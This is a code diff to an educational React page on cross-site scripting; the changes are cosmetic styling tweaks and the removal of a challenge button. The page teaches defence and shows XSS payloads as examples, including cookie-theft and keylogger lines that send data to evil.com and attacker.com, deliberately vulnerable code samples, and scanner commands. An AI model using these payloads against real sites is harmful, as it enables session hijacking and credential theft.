@@ -1,5 +1,5 @@
 import { useState } from 'react';
-import { Code, Shield, BookOpen, AlertTriangle, Terminal, Lock, Unlock, Globe, Eye, ArrowLeft, Target } from 'lucide-react';
+import { Code, Shield, BookOpen, AlertTriangle, Terminal, Lock, Unlock, Globe, Eye, ArrowLeft } from 'lucide-react';
 
 const tabs = [
   { id: 'theory', name: 'Theory', icon: BookOpen },
@@ -10,10 +10,9 @@ const tabs = [
 
 interface XSSConceptProps {
   onBack?: () => void;
-  onStartChallenge?: () => void;
 }
 
-export const XSSConcept = ({ onBack, onStartChallenge }: XSSConceptProps = {}) => {
+export const XSSConcept = ({ onBack }: XSSConceptProps = {}) => {
   const [activeTab, setActiveTab] = useState('theory');
 
   return (
@@ -38,15 +37,7 @@ export const XSSConcept = ({ onBack, onStartChallenge }: XSSConceptProps = {}) =
               <h1 className="text-4xl font-bold text-gray-900 dark:text-white">Cross-Site Scripting (XSS)</h1>
               <p className="text-emerald-600 dark:text-emerald-400 mt-2">Understand how attackers inject malicious scripts into trusted websites</p>
             </div>
-            {onStartChallenge && (
-              <button
-                onClick={onStartChallenge}
-                className="px-6 py-3 bg-emerald-600 hover:bg-emerald-700 dark:bg-emerald-500 dark:hover:bg-emerald-600 rounded-lg font-semibold transition-all flex items-center gap-2 text-white"
-              >
-                <Target className="w-5 h-5" />
-                Take Challenge
-              </button>
-            )}
+            
           </div>
 
           <div className="border-b border-gray-200 dark:border-gray-700 mb-8">
@@ -120,7 +111,7 @@ const TheoryTab = () => (
             Non-persistent attack where malicious script is reflected off the web server in the immediate
             response. User input is immediately returned without proper sanitization.
           </p>
-          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-sm">
             <code className="text-green-600 dark:text-green-400">
               search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
             </code>
@@ -139,7 +130,7 @@ const TheoryTab = () => (
             Persistent attack where malicious script is permanently stored on target servers (database,
             message forum, comment field). Most dangerous type of XSS.
           </p>
-          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-sm">
             <code className="text-green-600 dark:text-green-400">
               &lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;
             </code>
@@ -158,7 +149,7 @@ const TheoryTab = () => (
             Attack occurs entirely on the client-side. JavaScript code processes user input unsafely,
             modifying the DOM without server involvement.
           </p>
-          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-sm">
             <code className="text-green-600 dark:text-green-400">
               document.write(location.hash.substring(1));
             </code>
@@ -181,7 +172,7 @@ const TheoryTab = () => (
           <p className="text-gray-700 dark:text-gray-300 text-sm mb-3">
             Attackers steal session cookies to impersonate victims and gain unauthorized access to accounts.
           </p>
-          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-xs">
             <code className="text-green-600 dark:text-green-400">
               &lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie;&lt;/script&gt;
             </code>
@@ -196,7 +187,7 @@ const TheoryTab = () => (
           <p className="text-gray-700 dark:text-gray-300 text-sm mb-3">
             Install JavaScript keyloggers that capture every keystroke, including passwords and credit card numbers.
           </p>
-          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-xs">
             <code className="text-green-600 dark:text-green-400">
               document.addEventListener('keypress', e =&gt; fetch('//evil.com/log?k='+e.key));
             </code>
@@ -248,7 +239,7 @@ const TheoryTab = () => (
               <li>Spread to thousands of users within minutes</li>
               <li>Caused pop-ups, redirects, and unauthorized tweets</li>
             </ul>
-            <div className="bg-black/30 rounded-lg p-4 mt-4">
+            <div className="bg-slate-950/30 rounded-lg p-4 mt-4">
               <p className="text-sm font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Attack Payload:</p>
               <div className="font-mono text-xs text-gray-600 dark:text-gray-400">
                 &lt;script class="XSS"&gt;$('.status-body').mouseover(function()&#123;$.getScript('http://...')&#125;);&lt;/script&gt;
@@ -281,7 +272,7 @@ const TheoryTab = () => (
               <li>Forced MySpace to temporarily shut down to remove the worm</li>
               <li>Creator faced federal charges under Computer Fraud and Abuse Act</li>
             </ul>
-            <div className="bg-black/30 rounded-lg p-4 mt-4">
+            <div className="bg-slate-950/30 rounded-lg p-4 mt-4">
               <p className="text-sm font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Impact:</p>
               <p className="text-gray-600 dark:text-gray-400 text-sm">
                 Demonstrated the potential for XSS attacks to spread virally across social networks
@@ -363,7 +354,7 @@ const LabTab = () => (
             <Lock className="w-5 h-5 text-red-400" />
             Vulnerable HTML Form (INSECURE)
           </h3>
-          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded-lg p-4 font-mono text-sm overflow-x-auto">
             <pre className="text-gray-600 dark:text-gray-400">
 <code>{`<!-- VULNERABLE CODE - DO NOT USE IN PRODUCTION -->
 <div id="search-results">
@@ -388,7 +379,7 @@ const LabTab = () => (
             <Lock className="w-5 h-5 text-red-400" />
             Vulnerable Comment System (INSECURE)
           </h3>
-          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded-lg p-4 font-mono text-sm overflow-x-auto">
             <pre className="text-gray-600 dark:text-gray-400">
 <code>{`// VULNERABLE CODE - Stored XSS
 app.post('/comment', (req, res) => {
@@ -424,7 +415,7 @@ app.get('/comments', (req, res) => {
             <Lock className="w-5 h-5 text-red-400" />
             Vulnerable DOM Manipulation (INSECURE)
           </h3>
-          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded-lg p-4 font-mono text-sm overflow-x-auto">
             <pre className="text-gray-600 dark:text-gray-400">
 <code>{`// VULNERABLE CODE - DOM-based XSS
 const urlParams = new URLSearchParams(window.location.search);
@@ -445,42 +436,42 @@ document.getElementById('greeting').innerHTML = 'Hello ' + name + '!';
       <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
         <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
           <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">Basic Alert</h4>
-          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-2 font-mono text-xs">
             <code className="text-green-600 dark:text-green-400">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
           </div>
         </div>
 
         <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
           <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">Image Tag with onerror</h4>
-          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-2 font-mono text-xs">
             <code className="text-green-600 dark:text-green-400">&lt;img src=x onerror="alert(1)"&gt;</code>
           </div>
         </div>
 
         <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
           <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">Cookie Theft</h4>
-          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-2 font-mono text-xs">
             <code className="text-green-600 dark:text-green-400">&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;</code>
           </div>
         </div>
 
         <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
           <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">JavaScript Protocol</h4>
-          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-2 font-mono text-xs">
             <code className="text-green-600 dark:text-green-400">&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;</code>
           </div>
         </div>
 
         <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
           <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">Event Handler</h4>
-          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-2 font-mono text-xs">
             <code className="text-green-600 dark:text-green-400">&lt;body onload="alert(1)"&gt;</code>
           </div>
         </div>
 
         <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
           <h4 className="font-semibold mb-2 text-gray-900 dark:text-white">SVG Attack</h4>
-          <div className="bg-gray-900 dark:bg-black rounded p-2 font-mono text-xs">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-2 font-mono text-xs">
             <code className="text-green-600 dark:text-green-400">&lt;svg onload="alert(1)"&gt;</code>
           </div>
         </div>
@@ -499,7 +490,7 @@ document.getElementById('greeting').innerHTML = 'Hello ' + name + '!';
             <Lock className="w-5 h-5 text-green-600 dark:text-green-400" />
             Secure Output Encoding (PHP)
           </h3>
-          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded-lg p-4 font-mono text-sm overflow-x-auto">
             <pre className="text-gray-600 dark:text-gray-400">
 <code>{`<?php
 // SECURE CODE - HTML entity encoding
@@ -527,7 +518,7 @@ echo '<input type="text" value="' . htmlspecialchars($search_query, ENT_QUOTES, 
             <Lock className="w-5 h-5 text-green-600 dark:text-green-400" />
             Secure Output Encoding (JavaScript)
           </h3>
-          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded-lg p-4 font-mono text-sm overflow-x-auto">
             <pre className="text-gray-600 dark:text-gray-400">
 <code>{`// SECURE CODE - Use textContent instead of innerHTML
 const urlParams = new URLSearchParams(window.location.search);
@@ -549,7 +540,7 @@ document.getElementById('content').innerHTML = clean;`}</code>
             <Lock className="w-5 h-5 text-green-600 dark:text-green-400" />
             Secure Output Encoding (Python/Flask)
           </h3>
-          <div className="bg-gray-900 dark:bg-black rounded-lg p-4 font-mono text-sm overflow-x-auto">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded-lg p-4 font-mono text-sm overflow-x-auto">
             <pre className="text-gray-600 dark:text-gray-400">
 <code>{`from flask import Flask, request, render_template_string, escape
 import html
@@ -586,7 +577,7 @@ def search():
 
         <div>
           <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Strict CSP Header (Recommended)</h4>
-          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-sm">
             <code className="text-green-600 dark:text-green-400">
               Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
             </code>
@@ -595,7 +586,7 @@ def search():
 
         <div>
           <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Node.js/Express Implementation</h4>
-          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm overflow-x-auto">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-sm overflow-x-auto">
             <pre className="text-gray-600 dark:text-gray-400">
 <code>{`const helmet = require('helmet');
 
@@ -615,7 +606,7 @@ app.use(helmet.contentSecurityPolicy({
 
         <div>
           <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Apache .htaccess</h4>
-          <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-sm">
             <code className="text-green-600 dark:text-green-400">
               Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
             </code>
@@ -634,7 +625,7 @@ app.use(helmet.contentSecurityPolicy({
         <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
           <div>
             <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">PHP</h4>
-            <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
+            <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-xs">
               <code className="text-gray-600 dark:text-gray-400">
                 setcookie('session', $id, [<br />
                 &nbsp;&nbsp;'httponly' =&gt; true,<br />
@@ -647,7 +638,7 @@ app.use(helmet.contentSecurityPolicy({
 
           <div>
             <h4 className="font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Node.js/Express</h4>
-            <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
+            <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-xs">
               <code className="text-gray-600 dark:text-gray-400">
                 res.cookie('session', sessionId, {'{'}<br />
                 &nbsp;&nbsp;httpOnly: true,<br />
@@ -695,7 +686,7 @@ const ToolsTab = () => (
                 Advanced XSS detection suite with intelligent payload generation, WAF bypass, and
                 context-aware fuzzing capabilities.
               </p>
-              <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm mb-3">
+              <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-sm mb-3">
                 <code className="text-green-600 dark:text-green-400">
                   python xsstrike.py -u "http://target.com/search?q=test"
                 </code>
@@ -774,7 +765,7 @@ const ToolsTab = () => (
                 Automatic framework for detecting and exploiting XSS vulnerabilities with multiple
                 injection techniques.
               </p>
-              <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-sm mb-3">
+              <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-sm mb-3">
                 <code className="text-green-600 dark:text-green-400">
                   xsser --url "http://target.com" --auto
                 </code>
@@ -810,7 +801,7 @@ const ToolsTab = () => (
             Industry-standard JavaScript library for sanitizing HTML and preventing XSS attacks.
             Works in all modern browsers and Node.js.
           </p>
-          <div className="bg-gray-900 dark:bg-black rounded p-4 font-mono text-sm mb-4">
+          <div className="bg-gray-900 dark:bg-slate-950 rounded p-4 font-mono text-sm mb-4">
             <code className="text-gray-600 dark:text-gray-400">
               import DOMPurify from 'dompurify';<br />
               <br />
@@ -847,7 +838,7 @@ const ToolsTab = () => (
                 <li>Defense-in-depth security layer</li>
               </ul>
             </div>
-            <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
+            <div className="bg-gray-900 dark:bg-slate-950 rounded p-3 font-mono text-xs">
               <code className="text-gray-600 dark:text-gray-400">
                 Content-Security-Policy:<br />
                 &nbsp;&nbsp;default-src 'self';<br />
@@ -996,7 +987,7 @@ const ReferencesTab = () => (
             First major XSS worm that infected over 1 million MySpace users in 20 hours, demonstrating
             the viral potential of stored XSS attacks on social platforms.
           </p>
-          <div className="bg-black/30 rounded p-4 mb-3">
+          <div className="bg-slate-950/30 rounded p-4 mb-3">
             <p className="text-xs font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Key Lessons:</p>
             <ul className="list-disc list-inside space-y-1 text-xs text-gray-600 dark:text-gray-400">
               <li>Stored XSS can self-propagate across user-generated content</li>
